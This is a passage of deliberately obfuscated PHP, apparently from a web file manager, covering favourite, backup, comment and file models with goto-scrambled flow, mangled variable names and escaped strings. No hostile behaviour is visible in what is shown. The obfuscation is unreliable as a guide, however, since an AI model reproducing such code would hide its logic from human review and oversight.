remove($C¾£ï·µ—) { $dÛ”“ŒñÌÀ =& $_SERVER[´¬]; $fê”ö”Í—Ÿ = array($dÛ”“ŒñÌÀ[1518] => USER_ID, $dÛ”“ŒñÌÀ[410] => $C¾£ï·µ—); return $this->where($fê”ö”Í—Ÿ)->delete(); } protected function removeByName($AËí¾¿óµÍ) { $A©Ÿ‚›ö½Ò =& $_SERVER[´¬]; $D¶Ì¾‰¸Ãå = array($A©Ÿ‚›ö½Ò[1518] => USER_ID, $A©Ÿ‚›ö½Ò[411] => $AËí¾¿óµÍ, $A©Ÿ‚›ö½Ò[461] => 0); return $this->where($D¶Ì¾‰¸Ãå)->delete(); } protected function rename($A”İÔ…ˆ¢È, $DŞÌğ„ó™­) { $C„ã›øÍöÔ =& $_SERVER[´¬]; if ($A”İÔ…ˆ¢È == $DŞÌğ„ó™­) { return !1; } $dê¬¨ö‘¯­ = $this->getAutoName($DŞÌğ„ó™­); if ($DŞÌğ„ó™­ != $dê¬¨ö‘¯­) { return !1; } $cØÉ‘‘…—ï = array($C„ã›øÍöÔ[1518] => USER_ID, $C„ã›øÍöÔ[461] => 0, $C„ã›øÍöÔ[28] => $A”İÔ…ˆ¢È); return $this->where($cØÉ‘‘…—ï)->save(array($C„ã›øÍöÔ[28] => $DŞÌğ„ó™­)); } protected function resetSort($bÙå´×ôŠ) { $A™¹è‡¬¥Æ =& $_SERVER[´¬]; $bÙå´×ôŠ = is_array($bÙå´×ôŠ) ? $bÙå´×ôŠ : array(); $f„»„¹Ú“ = array($A™¹è‡¬¥Æ[1518] => USER_ID); for ($CˆÀœÔŒä = 0; $CˆÀœÔŒä < count($bÙå´×ôŠ); $CˆÀœÔŒä++) { $f„»„¹Ú“[$A™¹è‡¬¥Æ[410]] = $bÙå´×ôŠ[$CˆÀœÔŒä]; $this->where($f„»„¹Ú“)->save(array($A™¹è‡¬¥Æ[1693] => $CˆÀœÔŒä + 1)); } return !0; } protected function moveTop($E°Éîäá) { goto FÆ÷”ƒ…†ù; aæÍ†ê‰Á›: $CŠô–ïÓ¥ = $eê‰õæîÅˆ; $eê‰õæîÅˆ = array_remove_value($eê‰õæîÅˆ, $B‹ğ‹Ì[$c×œÁÂ°ˆ[392]]); array_unshift($eê‰õæîÅˆ, $B‹ğ‹Ì[$c×œÁÂ°ˆ[392]]); goto eçÄâ‹“Ú”; FÆ÷”ƒ…†ù: $c×œÁÂ°ˆ =& $_SERVER[´¬]; $FÙÕï†ë½ƒ = array($c×œÁÂ°ˆ[1518] => USER_ID, $c×œÁÂ°ˆ[461] => 0); $B‹ğ‹Ì = $this->where($FÙÕï†ë½ƒ)->where(array($c×œÁÂ°ˆ[28] => $E°Éîäá))->find(); goto aÔâñÕáŒÜ; aÔâñÕáŒÜ: if (!$B‹ğ‹Ì) { return; } $eê‰õæîÅˆ = $this->field($c×œÁÂ°ˆ[392])->where($FÙÕï†ë½ƒ)->order($c×œÁÂ°ˆ[2110])->select(); $eê‰õæîÅˆ = array_to_keyvalue($eê‰õæîÅˆ, $c×œÁÂ°ˆ[33], $c×œÁÂ°ˆ[392]); goto aæÍ†ê‰Á›; eçÄâ‹“Ú”: return $this->resetSort($eê‰õæîÅˆ); goto Bìàî·àø›; Bìàî·àø›: } protected function moveBottom($c·ÍÕŠçØö) { $a›æµÀ±œ³ =& $_SERVER[´¬]; $c®ê±‘Šåâ = array($a›æµÀ±œ³[1518] => USER_ID, $a›æµÀ±œ³[461] => 0); $A»Š–ÖÉÕö = $this->where($c®ê±‘Šåâ)->max($a›æµÀ±œ³[1712]); $c…„òˆ³ö‡ = array($a›æµÀ±œ³[1712] => $A»Š–ÖÉÕö + 1); return $this->where($c®ê±‘Šåâ)->where(array($a›æµÀ±œ³[28] => $c·ÍÕŠçØö))->save($c…„òˆ³ö‡); } private function getAutoName($FªŒ¯ª’ï‡) { goto F‚„á†Ì–æ; E”“­«ÆŸ™: $E”×Ş…“Ôê = array_to_keyvalue($E”×Ş…“Ôê, $D¹³¢Õƒ™[33], $D¹³¢Õƒ™[28]); if (!$E”×Ş…“Ôê || !in_array($FªŒ¯ª’ï‡, $E”×Ş…“Ôê)) { return $FªŒ¯ª’ï‡; } for ($e°óùõò²Ì = 0; $e°óùõò²Ì < count($E”×Ş…“Ôê); $e°óùõò²Ì++) { if (!in_array($FªŒ¯ª’ï‡ . "\x28{$e°óùõò²Ì}\x29", $E”×Ş…“Ôê)) { return $FªŒ¯ª’ï‡ . "\x28{$e°óùõò²Ì}\x29"; } } goto B™©ˆºîÈ; B™©ˆºîÈ: return $FªŒ¯ª’ï‡ . "\50{$e°óùõò²Ì}\51"; goto aÀœîêô‰; F‚„á†Ì–æ: $D¹³¢Õƒ™ =& $_SERVER[´¬]; $aÇøì¢ô´ö = array($D¹³¢Õƒ™[1518] => USER_ID, $D¹³¢Õƒ™[461] => 0); $E”×Ş…“Ôê = $this->field($D¹³¢Õƒ™[28])->where($aÇøì¢ô´ö)->select(); goto E”“­«ÆŸ™; aÀœîêô‰: } } goto fùì¡ƒ›Ğô; b‰çË§·•î: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\x62\141\x63\153\x75\x70\x4c\x69\163\164"; public $field = array("\151\157", "\156\x61\x6d\x65", "\163\x74\x61\x74\165\x73", "\143\157\156\164\x65\x6e\x74", "\162\x65\163\x75\154\164", "\164\151\x6d\145\106\162\157\x6d", "\164\x69\155\x65\124\157"); public function config() { goto Aåˆ„£Ùï°; DÀÜì´Ï£: Action($eºî‘µÕ[1713])->taskInit(); $f÷ ¹ï£ÜÔ = Model($eºî‘µÕ[1714])->listData(); foreach ($f÷ ¹ï£ÜÔ as $C™Ëğ½Ì‰é) { if ($C™Ëğ½Ì‰é[$eºî‘µÕ[1171]] == $eºî‘µÕ[87] && $C™Ëğ½Ì‰é[$eºî‘µÕ[1515]] == $eºî‘µÕ[1715]) { $bäÎîä³¸Ñ = $C™Ëğ½Ì‰é; break; } } goto BŸÄöø«; Aåˆ„£Ùï°: $eºî‘µÕ =& $_SERVER[´¬]; $EÄŠ× ¶–ñ = Model($eºî‘µÕ[730])->get($eºî‘µÕ[742]); $EÄŠ× ¶–ñ = json_decode($EÄŠ× ¶–ñ, !0); goto C‡çÛ†¾œ¨; BŸÄöø«: if (isset($bäÎîä³¸Ñ[$eºî‘µÕ[196]])) { $bäÎîä³¸Ñ[$eºî‘µÕ[196]] = json_decode($bäÎîä³¸Ñ[$eºî‘µÕ[196]], !0); } if (isset($EÄŠ× ¶–ñ[$eºî‘µÕ[196]])) { $bäÎîä³¸Ñ[$eºî‘µÕ[196]][$eºî‘µÕ[1500]] = $EÄŠ× ¶–ñ[$eºî‘µÕ[196]]; unset($EÄŠ× ¶–ñ[$eºî‘µÕ[196]]); } return array_merge($bäÎîä³¸Ñ, $EÄŠ× ¶–ñ); goto EŸ†Ÿù‰•; C‡çÛ†¾œ¨: $EÄŠ× ¶–ñ = is_array($EÄŠ× ¶–ñ) ? $EÄŠ× ¶–ñ : array(); if (!isset($EÄŠ× ¶–ñ[$eºî‘µÕ[716]])) { $EÄŠ× ¶–ñ[$eºî‘µÕ[716]] = $eºî‘µÕ[87]; } $bäÎîä³¸Ñ = array(); goto DÀÜì´Ï£; EŸ†Ÿù‰•: } public function listData($cåÅ«Éğõ„ = false, $E×í£‘¥îª = "\155\x6f\x64\x69\146\171\124\x69\155\145", $b¼ªİøÃìÚ = false) { return parent::listData($cåÅ«Éğõ„, $E×í£‘¥îª, !0); } public function lastItem() { $A“½ÛõƒĞ = $this->listData(); return !empty($A“½ÛõƒĞ[0]) ? $A“½ÛõƒĞ[0] : null; } public function kill($aÅÄÑÃ¢×É) { goto aÀ°šî­Ö; A²ÄÓËö¡Ø: return $this->remove($aÅÄÑÃ¢×É); goto c¯¼‘¯Ç–; a¹Ÿë¡µòÓ: $f·‘óù‹·ô = $cĞ²“Úç¶Ó[$Bó¸ÄÏŒÅ©[28]]; $e–ÛÉ•Ûë¯ = TEMP_FILES . $Bó¸ÄÏŒÅ©[738] . $f·‘óù‹·ô . $Bó¸ÄÏŒÅ©[8]; IO::remove($e–ÛÉ•Ûë¯, !1); goto A²ÄÓËö¡Ø; aÀ°šî­Ö: $Bó¸ÄÏŒÅ© =& $_SERVER[´¬]; $cĞ²“Úç¶Ó = $this->listData($aÅÄÑÃ¢×É); if (!$cĞ²“Úç¶Ó || empty($cĞ²“Úç¶Ó[$Bó¸ÄÏŒÅ©[28]])) { return !0; } goto EÅ¬ìÑ‚ô¨; EÅ¬ìÑ‚ô¨: Task::kill($Bó¸ÄÏŒÅ©[741]); Task::kill($Bó¸ÄÏŒÅ©[764]); Task::kill($Bó¸ÄÏŒÅ©[774]); goto a¹Ÿë¡µòÓ; c¯¼‘¯Ç–: } public function remove($B‚Õ ÕŸÙÌ) { $fÍÁİáÒÀª = $this->listData($B‚Õ ÕŸÙÌ); if (!$fÍÁİáÒÀª) { return !0; } return $this->backupRemove($fÍÁİáÒÀª); } private function backupRemove($cßÍ‰ñÇ§­) { parent::remove($cßÍ‰ñÇ§­[$_SERVER[´¬][392]]); $e‹¤èº‘‹ = $this->backupPath($cßÍ‰ñÇ§­); IO::remove($e‹¤èº‘‹, !1); return !0; } private function backupPath($f¸…¡¡) { $DÅõëò‚ï =& $_SERVER[´¬]; $eíÁÓŸöğ = $f¸…¡¡[$DÅõëò‚ï[28]]; $AØ¹šùğÁÃ = Model($DÅõëò‚ï[730])->get($DÅõëò‚ï[731]); $EÇÚØ×š«Ú = substr(md5($DÅõëò‚ï[732] . $AØ¹šùğÁÃ . $eíÁÓŸöğ), 0, 8); return "\173\x69\157\72{$f¸…¡¡[$DÅõëò‚ï[715]]}\175\57\x64\141\x74\x61\x62\x61\x73\145\x2f\x62\x61\143\153\x75\160\x2f" . $eíÁÓŸöğ . $DÅõëò‚ï[71] . $EÇÚØ×š«Ú; } public function start() { goto eŒ«¤Ÿºë; eŒ«¤Ÿºë: $eñÇˆáâ° =& $_SERVER[´¬]; if ($GLOBALS[$eñÇˆáâ°[6]][$eñÇˆáâ°[88]][$eñÇˆáâ°[1716]] != $eñÇˆáâ°[87]) { return !0; } $AœÁéöéõ = $this->config(); goto c»•§„¶; b™—Ë”Õ¤ğ: $CÔÑÓ˜´«£ = new Backup(); $CÔÑÓ˜´«£->keep(); $Có™›Û¢…¥ = $CÔÑÓ˜´«£->db(); goto b¨õ ×Îï¯; b¨õ ×Îï¯: if ($Có™›Û¢…¥) { $Có™›Û¢…¥ = $CÔÑÓ˜´«£->dbFile(); if ($Có™›Û¢…¥ && $AœÁéöéõ[$eñÇˆáâ°[716]] == $eñÇˆáâ°[495]) { $Có™›Û¢…¥ = $CÔÑÓ˜´«£->file(); } } Backup::set(array($eñÇˆáâ°[713] => 1, $eñÇˆáâ°[474] => time())); return !0; goto bˆñïªøÃ; c»•§„¶: if (!$AœÁéöéõ || $AœÁéöéõ[$eñÇˆáâ°[1497]] != $eñÇˆáâ°[87]) { return !1; } $B…ÓÀÂ±ëš = $this->process(); foreach ($B…ÓÀÂ±ëš as $A´ğ“º‘‰É) { if ($A´ğ“º‘‰É) { return Task::restart($A´ğ“º‘‰É[$eñÇˆáâ°[392]]); } } goto b™—Ë”Õ¤ğ; bˆñïªøÃ: } public function process() { $E˜îÀÀó¦Ğ =& $_SERVER[´¬]; return array($E˜îÀÀó¦Ğ[718] => Task::get($E˜îÀÀó¦Ğ[741]), $E˜îÀÀó¦Ğ[722] => Task::get($E˜îÀÀó¦Ğ[764]), $E˜îÀÀó¦Ğ[192] => Task::get($E˜îÀÀó¦Ğ[774])); } public function restore() { $eÈÖ“³ŞÉŒ =& $_SERVER[´¬]; ActionCall($eÈÖ“³ŞÉŒ[1019], !0, 1); ActionCall($eÈÖ“³ŞÉŒ[1019], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\156\x74"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\x6d\145" => "\143\157\155\x6d\145\x6e\x74\137\155\x65\x74\141", "\x6d\145\164\141\106\x69\x65\x6c\x64" => "\143\157\155\x6d\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($e›é…æßñ¨) { $dĞÂ¿†åÈŒ =& $_SERVER[´¬]; if ($e›é…æßñ¨[$dĞÂ¿†åÈŒ[1717]]) { $dÔ´¢ÂÈˆ— = $this->where(array($dĞÂ¿†åÈŒ[1718] => $e›é…æßñ¨[$dĞÂ¿†åÈŒ[1717]]))->find(); if (!$dÔ´¢ÂÈˆ— || $dÔ´¢ÂÈˆ—[$dĞÂ¿†åÈŒ[402]] != $e›é…æßñ¨[$dĞÂ¿†åÈŒ[402]] || $dÔ´¢ÂÈˆ—[$dĞÂ¿†åÈŒ[482]] != $e›é…æßñ¨[$dĞÂ¿†åÈŒ[482]]) { return !1; } $this->where(array($dĞÂ¿†åÈŒ[1718] => $e›é…æßñ¨[$dĞÂ¿†åÈŒ[1717]]))->setAdd($dĞÂ¿†åÈŒ[1719], 1); } $e›é…æßñ¨[$dĞÂ¿†åÈŒ[1720]] = 0; $e›é…æßñ¨[$dĞÂ¿†åÈŒ[1719]] = 0; $e›é…æßñ¨[$dĞÂ¿†åÈŒ[713]] = 1; return $this->add($e›é…æßñ¨); } public function commentCount($C–öÎÇä‘, $a‰¨¨¢ÎÏß) { goto b±Ñ–‘—å; b±Ñ–‘—å: $F®”¨Ìä =& $_SERVER[´¬]; if (!$C–öÎÇä‘) { return array(); } if (is_string($C–öÎÇä‘) || is_int($C–öÎÇä‘)) { $C–öÎÇä‘ = array($C–öÎÇä‘); } goto FÏº¬¿„Â; DïÃÑƒŞËÎ: return array_to_keyvalue($A³ƒˆî‚Ğ, $F®”¨Ìä[482], $F®”¨Ìä[478]); goto ešÃŸµÀÔ; FÏº¬¿„Â: $f¨ê²À”±“ = array($F®”¨Ìä[482], $F®”¨Ìä[1721] => $F®”¨Ìä[478]); $dÈ„‡—’£ = array($F®”¨Ìä[482] => array($F®”¨Ìä[7], $C–öÎÇä‘), $F®”¨Ìä[402] => $a‰¨¨¢ÎÏß); $A³ƒˆî‚Ğ = $this->field($f¨ê²À”±“)->where($dÈ„‡—’£)->group($F®”¨Ìä[482])->select(); goto DïÃÑƒŞËÎ; ešÃŸµÀÔ: } public function remove($B…‚ëÚÛ¢¸) { $A²ÍÂŸ“å¦ =& $_SERVER[´¬]; $EÈºï£ŠÄ = array($A²ÍÂŸ“å¦[1718] => $B…‚ëÚÛ¢¸); $F’Ä©ª×— = $this->where($EÈºï£ŠÄ)->find(); if ($F’Ä©ª×—[$A²ÍÂŸ“å¦[1717]]) { $this->where(array($A²ÍÂŸ“å¦[1718] => $F’Ä©ª×—[$A²ÍÂŸ“å¦[1717]]))->setAdd($A²ÍÂŸ“å¦[1719], -1); } return $this->where($EÈºï£ŠÄ)->delete(); } public function edit($c‰£ïâŠôö, $CŠ‹í´Éñ¶) { $eù¶æ¯¦­é =& $_SERVER[´¬]; $f¼ß˜ÄÄáˆ = array($eù¶æ¯¦­é[1718] => $c‰£ïâŠôö); return $this->where($f¼ß˜ÄÄáˆ)->save(array($eù¶æ¯¦­é[1722] => $CŠ‹í´Éñ¶)); } public function prasise($DŒ¦ˆÊ®Á) { $EÏöï¹ñ÷Ù =& $_SERVER[´¬]; $Cª¡›å‡ = Model($EÏöï¹ñ÷Ù[1723]); $F‡Ù¡…Ù = array($EÏöï¹ñ÷Ù[1718] => $DŒ¦ˆÊ®Á, $EÏöï¹ñ÷Ù[1518] => USER_ID); $c†·©‘»¨£ = $Cª¡›å‡->where($F‡Ù¡…Ù)->find(); if (!$c†·©‘»¨£) { $Cª¡›å‡->add($F‡Ù¡…Ù); $b™„Œ›ñ³œ = $this->where(array($EÏöï¹ñ÷Ù[1718] => $DŒ¦ˆÊ®Á))->setAdd($EÏöï¹ñ÷Ù[1720], 1); } else { $Cª¡›å‡->where($F‡Ù¡…Ù)->delete(); $b™„Œ›ñ³œ = $this->where(array($EÏöï¹ñ÷Ù[1718] => $DŒ¦ˆÊ®Á))->setAdd($EÏöï¹ñ÷Ù[1720], -1); } return $b™„Œ›ñ³œ; } public function targetInfo($bãï†ôŸë, $A‰Ë —­¡å) { goto Eô±©•´Ì; BÆººàÂ²: $e¾¨óÎ”Ì = "\122\111\x47\110\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\143\157\x6d\x6d\x65\156\164\137\x70\162\141\x69\163\145\40\163\164\141\162\x20\x6f\156\x20\x63\x6f\x6d\155\x65\x6e\x74\56\143\157\x6d\155\x65\x6e\164\111\104\x20\x3d\x20\163\x74\x61\162\x2e\x63\157\155\x6d\145\x6e\x74\x49\104"; $EÎ²ÜÔ ‹ô = $this->alias($a­ÜÌŠ¯Ğ‚[351])->where($a÷‚‡ºùà‰)->join($e¾¨óÎ”Ì, $a­ÜÌŠ¯Ğ‚[1724])->count(); $døóå‡ù£Ì = array($a­ÜÌŠ¯Ğ‚[1725] => $DöÓƒÚìâÈ, $a­ÜÌŠ¯Ğ‚[1726] => $EÎ²ÜÔ ‹ô); goto D¬ÜÒĞ„Š; D¬ÜÒĞ„Š: return $døóå‡ù£Ì; goto Fò‘ŞÖĞ; Eô±©•´Ì: $a­ÜÌŠ¯Ğ‚ =& $_SERVER[´¬]; $a÷‚‡ºùà‰ = array($a­ÜÌŠ¯Ğ‚[548] => $bãï†ôŸë, $a­ÜÌŠ¯Ğ‚[549] => $A‰Ë —­¡å); $DöÓƒÚìâÈ = $this->where($a÷‚‡ºùà‰)->count(); goto BÆººàÂ²; Fò‘ŞÖĞ: } public function listData($AäãÀˆäŠ) { $EÔ™²™Í‡ =& $_SERVER[´¬]; if (isset($AäãÀˆäŠ[$EÔ™²™Í‡[1727]])) { if ($AäãÀˆäŠ[$EÔ™²™Í‡[1727]]) { $AäãÀˆäŠ[$EÔ™²™Í‡[1728]] = array($EÔ™²™Í‡[972], intval($AäãÀˆäŠ[$EÔ™²™Í‡[1727]])); } unset($AäãÀˆäŠ[$EÔ™²™Í‡[1727]]); } if (isset($AäãÀˆäŠ[$EÔ™²™Í‡[1729]])) { if ($AäãÀˆäŠ[$EÔ™²™Í‡[1729]]) { $AäãÀˆäŠ[$EÔ™²™Í‡[1728]] = array($EÔ™²™Í‡[969], intval($AäãÀˆäŠ[$EÔ™²™Í‡[1729]])); } unset($AäãÀˆäŠ[$EÔ™²™Í‡[1729]]); } return $this->_listData($AäãÀˆäŠ); } private function _listData($cËÒìŒœ§µ) { $a±¥§Š×õÇ =& $_SERVER[´¬]; $d—Ù´ç“²· = $this->where($cËÒìŒœ§µ)->_makeOrder()->selectPage(100); $this->_listAppendParent($d—Ù´ç“²·[$a±¥§Š×õÇ[366]]); $this->_listAppendUser($d—Ù´ç“²·[$a±¥§Š×õÇ[366]]); $this->_listAppendMeta($d—Ù´ç“²·[$a±¥§Š×õÇ[366]]); return $d—Ù´ç“²·; } private function _makeOrder() { $C•ó´’¯´æ =& $_SERVER[´¬]; $eÜÈƒéîÖ = array($C•ó´’¯´æ[1720], $C•ó´’¯´æ[1719], $C•ó´’¯´æ[193]); $CñŠ„ùÀë¬ = Input::get($C•ó´’¯´æ[433], $C•ó´’¯´æ[7], $C•ó´’¯´æ[414], $eÜÈƒéîÖ); $cõŸ¿²î = Input::get($C•ó´’¯´æ[434], $C•ó´’¯´æ[7], $C•ó´’¯´æ[1520], array($C•ó´’¯´æ[1730], $C•ó´’¯´æ[429])); $d»îã†¿ = $CñŠ„ùÀë¬ . $C•ó´’¯´æ[50] . $cõŸ¿²î; return $this->order($d»îã†¿); } private function _listAppendParent(&$D¨½‰ÊŞİ‘) { goto AÙ¼Ûíå»›; AÙ¼Ûíå»›: $C¥æ¥†å› =& $_SERVER[´¬]; $CØó½‡¡«Š = array_unique(array_to_keyvalue($D¨½‰ÊŞİ‘, $C¥æ¥†å›[33], $C¥æ¥†å›[1717])); $CØó½‡¡«Š = array_remove_value($CØó½‡¡«Š, $C¥æ¥†å›[495]); goto eÊ›Ú¼Ñªİ; eÊ›Ú¼Ñªİ: if (!$CØó½‡¡«Š) { return; } $Fé—§ò¨ì = $this->where(array($C¥æ¥†å›[1718] => array($C¥æ¥†å›[7], $CØó½‡¡«Š)))->select(); $Fé—§ò¨ì = array_to_keyvalue($Fé—§ò¨ì, $C¥æ¥†å›[1728]); goto AÀ ‡’£å; AÀ ‡’£å: foreach ($D¨½‰ÊŞİ‘ as &$Dã‚Ú®·¢) { if (isset($Fé—§ò¨ì[$Dã‚Ú®·¢[$C¥æ¥†å›[1717]]])) { $Dã‚Ú®·¢[$C¥æ¥†å›[1731]] = $Fé—§ò¨ì[$Dã‚Ú®·¢[$C¥æ¥†å›[1717]]]; } } unset($Dã‚Ú®·¢); goto A´Úà±‹ÓŸ; A´Úà±‹ÓŸ: } private function _listAppendUser(&$EØâÌ¸ôâÏ) { goto EŸ”½âÕ¶Ó; EŸ”½âÕ¶Ó: $C®˜‘¤Œõ“ =& $_SERVER[´¬]; $A½°Œƒ†ù¼ = array_unique(array_to_keyvalue($EØâÌ¸ôâÏ, $C®˜‘¤Œõ“[33], $C®˜‘¤Œõ“[1526])); $A½°Œƒ†ù¼ = array_remove_value($A½°Œƒ†ù¼, $C®˜‘¤Œõ“[495]); goto cèöÆĞáò®; cèöÆĞáò®: if (count($A½°Œƒ†ù¼) == 0) { return; } foreach ($EØâÌ¸ôâÏ as $f°Ş»Éë§) { if (isset($f°Ş»Éë§[$C®˜‘¤Œõ“[1731]])) { $A½°Œƒ†ù¼[] = $f°Ş»Éë§[$C®˜‘¤Œõ“[1731]][$C®˜‘¤Œõ“[1526]]; } } $C‹ÇŒŸ—ğ˜ = Model($C®˜‘¤Œõ“[505])->userListInfo($A½°Œƒ†ù¼); goto bŞ——ºÛÔ; bŞ——ºÛÔ: foreach ($EØâÌ¸ôâÏ as &$f°Ş»Éë§) { $f°Ş»Éë§[$C®˜‘¤Œõ“[561]] = $C‹ÇŒŸ—ğ˜[$f°Ş»Éë§[$C®˜‘¤Œõ“[1526]]]; if (isset($f°Ş»Éë§[$C®˜‘¤Œõ“[1731]])) { $f°Ş»Éë§[$C®˜‘¤Œõ“[1731]][$C®˜‘¤Œõ“[561]] = $C‹ÇŒŸ—ğ˜[$f°Ş»Éë§[$C®˜‘¤Œõ“[1731]][$C®˜‘¤Œõ“[1526]]]; } } unset($f°Ş»Éë§); goto CÈ²‹ —ÀÖ; CÈ²‹ —ÀÖ: } private function _listAppendMeta(&$d½Ùíé¢) { goto fÚ·‹µ†ñ; EßÍ°¥ßÉ: if (!$bÜò²á²ì³) { return; } foreach ($d½Ùíé¢ as $A¼±”§ö™) { if (isset($A¼±”§ö™[$CÃ‘˜ƒŸˆœ[1731]])) { $bÜò²á²ì³[] = $A¼±”§ö™[$CÃ‘˜ƒŸˆœ[1731]][$CÃ‘˜ƒŸˆœ[1728]]; } } $A¾­Ë‘œ«Ö = $this->metaList($bÜò²á²ì³); goto e¬¸ó¿…•; e¬¸ó¿…•: if (!$A¾­Ë‘œ«Ö) { return !1; } foreach ($d½Ùíé¢ as &$A¼±”§ö™) { $A¼±”§ö™[$CÃ‘˜ƒŸˆœ[443]] = $A¾­Ë‘œ«Ö[$A¼±”§ö™[$CÃ‘˜ƒŸˆœ[1728]]]; if (isset($A¼±”§ö™[$CÃ‘˜ƒŸˆœ[1731]])) { $A¼±”§ö™[$CÃ‘˜ƒŸˆœ[1731]][$CÃ‘˜ƒŸˆœ[443]] = $A¾­Ë‘œ«Ö[$A¼±”§ö™[$CÃ‘˜ƒŸˆœ[1731]][$CÃ‘˜ƒŸˆœ[1728]]]; } } unset($A¼±”§ö™); goto eñ«°Ì¢öƒ; fÚ·‹µ†ñ: $CÃ‘˜ƒŸˆœ =& $_SERVER[´¬]; $bÜò²á²ì³ = array_unique(array_to_keyvalue($d½Ùíé¢, $CÃ‘˜ƒŸˆœ[33], $CÃ‘˜ƒŸˆœ[1728])); $bÜò²á²ì³ = array_remove_value($bÜò²á²ì³, $CÃ‘˜ƒŸˆœ[495]); goto EßÍ°¥ßÉ; eñ«°Ì¢öƒ: } private function metaList($E£ï—ƒìÂÉ) { goto fŠÆ¡áçˆç; fŠÆ¡áçˆç: $Aó±Å±ë’ =& $_SERVER[´¬]; if (!$E£ï—ƒìÂÉ) { return array(); } $D¢áÅô = array($Aó±Å±ë’[1728] => array($Aó±Å±ë’[7], $E£ï—ƒìÂÉ)); goto AĞ’ˆéé¹ø; AĞ’ˆéé¹ø: $E‹İê™ë® = Model($Aó±Å±ë’[1732])->where($D¢áÅô)->select(); $E‹İê™ë® = array_to_keyvalue_group($E‹İê™ë®, $Aó±Å±ë’[1728]); foreach ($E‹İê™ë® as $d’Ò¤‚·äè => $c²óŒ”‡ç‚) { $bÈá®‹ìÎ = array(); foreach ($c²óŒ”‡ç‚ as $C©Ë«¥§¼Ğ) { $bÈá®‹ìÎ[$C©Ë«¥§¼Ğ[$Aó±Å±ë’[93]]] = $C©Ë«¥§¼Ğ[$Aó±Å±ë’[371]]; } $E‹İê™ë®[$d’Ò¤‚·äè] = $bÈá®‹ìÎ; } goto c‡°ŒíÂ…; c‡°ŒíÂ…: return $E‹İê™ë® ? $E‹İê™ë® : array(); goto díöÛò×ù; díöÛò×ù: } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145\137\143\x6f\x6e\164\145\x6e\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\151\x6d\145", "\164\151\x6d\145", "\151\x6e\x73\145\162\x74", "\x66\165\156\143\x74\151\157\156")); } goto d­‘µ§‚‹¯; d­‘µ§‚‹¯: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\145" => "\x69\157\137\146\151\x6c\145\x5f\x6d\x65\x74\x61", "\155\x65\164\141\106\x69\x65\154\144" => "\146\151\x6c\145\x49\x44"); public function fileInfo($eÃ¶ß¸ÈĞÚ) { $fâ²à®Ãªö =& $_SERVER[´¬]; static $aš†ìõñÉŒ = array(); if (!isset($aš†ìõñÉŒ[$eÃ¶ß¸ÈĞÚ])) { $eŒĞ®¨â¬Ø = $fâ²à®Ãªö[1733]; $A÷ìªÊ¦ = Model($fâ²à®Ãªö[448])->field($eŒĞ®¨â¬Ø)->where(array($fâ²à®Ãªö[446] => $eÃ¶ß¸ÈĞÚ))->find(); $aš†ìõñÉŒ[$eÃ¶ß¸ÈĞÚ] = $A÷ìªÊ¦; } return $aš†ìõñÉŒ[$eÃ¶ß¸ÈĞÚ]; } public function addFileByContent($Fîæ¢ô’ = '', $bˆ¶Ÿ·¯ù§ = '') { goto bŒºª‰èäô; BÒ·´¥å¿‹: if (file_exists($CÊ¾«ª¤š)) { @unlink($CÊ¾«ª¤š); } return $bôµšê‰É; goto f¹ßÑÅÆï™; bŒºª‰èäô: $còãò‰‹„ =& $_SERVER[´¬]; $bÜğ¶’¡’ = TEMP_PATH . $còãò‰‹„[1734]; if (!is_dir($bÜğ¶’¡’)) { mk_dir($bÜğ¶’¡’); } goto dÅŠ¹Ó¦…Œ; dÅŠ¹Ó¦…Œ: $CÊ¾«ª¤š = $bÜğ¶’¡’ . $còãò‰‹„[1735] . rand_string(16); file_put_contents($CÊ¾«ª¤š, $Fîæ¢ô’); $bôµšê‰É = $this->addFile($CÊ¾«ª¤š, $bˆ¶Ÿ·¯ù§, !0); goto BÒ·´¥å¿‹; f¹ßÑÅÆï™: } public function createFileName($bÎÎèÕİĞ, $dÚŸÖ‡çø = false, $cªŠ×Ö = false) { goto eÕ‘³È‘Ùæ; A¤÷·Å¢: $AÃåĞÏî³“ = $cŞŞ»Æ·Ë->pathFather($c¿Ë¤ì†Óø); static $C’÷°à•ŞÍ = false; $aßî’®Î„ = $CÅè·À‰™Í[1736] . md5($AÃåĞÏî³“); goto dÅ¢ï¶¦; dÅ¢ï¶¦: if (!$C’÷°à•ŞÍ && !Cache::get($aßî’®Î„)) { $C’÷°à•ŞÍ = !0; $fõè¨×«¨í = IO::mkdir($AÃåĞÏî³“); if (!IO::exist($fõè¨×«¨í . $CÅè·À‰™Í[761])) { IO::mkfile($fõè¨×«¨í . $CÅè·À‰™Í[761]); } Cache::set($aßî’®Î„, 1, 3600 * 2); } return $c¿Ë¤ì†Óø; goto CÎÎ±»–; eÕ‘³È‘Ùæ: $CÅè·À‰™Í =& $_SERVER[´¬]; $cŞŞ»Æ·Ë = IO::init($CÅè·À‰™Í[8]); $c¿Ë¤ì†Óø = $this->makeFilePath($bÎÎèÕİĞ, $cŞŞ»Æ·Ë, $dÚŸÖ‡çø, $cªŠ×Ö); goto A¤÷·Å¢; CÎÎ±»–: } public function makeFilePath($D¢¡Ü‰š£, $c‘ìÍ™·øß, $E¼…ÉšÇä = false, $DÁÄ²È‡¡ = false) { goto e‰½„ôÓÅÎ; e‰½„ôÓÅÎ: $AÒĞ§ç®˜ =& $_SERVER[´¬]; $bÛ¢ô†¼µ = Model($AÒĞ§ç®˜[730])->get($AÒĞ§ç®˜[1737]); $EÃ¾³ĞŠßÜ = KodIO::defaultIO() . date($AÒĞ§ç®˜[1738]); goto F–ÊÍ‰ˆ¾Ÿ; F–ÊÍ‰ˆ¾Ÿ: $e³ˆèÃäµ = $EÃ¾³ĞŠßÜ . rand_string(5) . short_id(100); $D¢¡Ü‰š£ = 